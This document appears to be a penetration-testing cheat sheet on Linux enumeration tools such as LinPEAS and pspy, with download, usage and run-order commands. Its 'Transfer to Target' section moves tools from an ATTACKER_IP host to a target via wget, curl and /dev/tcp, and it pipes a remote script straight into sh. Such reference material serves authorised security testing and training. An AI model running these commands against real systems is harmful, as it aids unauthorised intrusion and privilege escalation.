# Linux Enumeration Tools

## Download Instructions

### LinPEAS

```bash
# Latest version
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh

# Or from GitHub directly
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
```

### LinEnum

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh
chmod +x linenum.sh
```

### Linux Smart Enumeration (LSE)

```bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
```

### pspy (Process Spy)

```bash
# 64-bit
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64

# 32-bit
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
chmod +x pspy32
```

### Linux Exploit Suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh
```

---

## Usage

### LinPEAS

```bash
# Basic
./linpeas.sh

# Save output
./linpeas.sh | tee linpeas_output.txt

# Specific checks
./linpeas.sh -s  # Silent mode (no colors)
./linpeas.sh -a  # All checks
./linpeas.sh -e  # Extra enumeration

# One-liner from remote
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### LinEnum

```bash
# Basic
./linenum.sh

# Thorough scan
./linenum.sh -t

# Export to file
./linenum.sh -e /tmp/export -t
```

### LSE

```bash
# Basic
./lse.sh

# Increase level (more info)
./lse.sh -l 1  # Interesting
./lse.sh -l 2  # All info

# Selection
./lse.sh -i    # Non-interactive
```

### pspy

```bash
# Run and monitor
./pspy64

# With timestamps
./pspy64 -t

# Monitor specific directories
./pspy64 -d /tmp -d /var/tmp
```

---

## Transfer to Target

### Quick HTTP Server (Attacker)

```bash
# Serve current directory
python3 -m http.server 80
```

### Download on Target

```bash
# wget
wget http://ATTACKER_IP/linpeas.sh

# curl
curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh

# bash tcp
cat < /dev/tcp/ATTACKER_IP/80 > linpeas.sh
```

---

## What Each Tool Checks

| Tool | Capabilities |
|------|--------------|
| LinPEAS | Comprehensive: users, SUID, cron, network, processes, files, CVEs |
| LinEnum | System info, users, jobs, networking, services, file permissions |
| LSE | Smart enumeration with color-coded findings by severity |
| pspy | Process monitoring without root (catches cron jobs) |
| LES | Kernel exploit suggestions based on version |

---

## Recommended Order

1. **pspy** - Run first in background to catch scheduled tasks
2. **LinPEAS** - Comprehensive enumeration
3. **Linux Exploit Suggester** - Check for kernel exploits
4. **Manual checks** - Based on findings



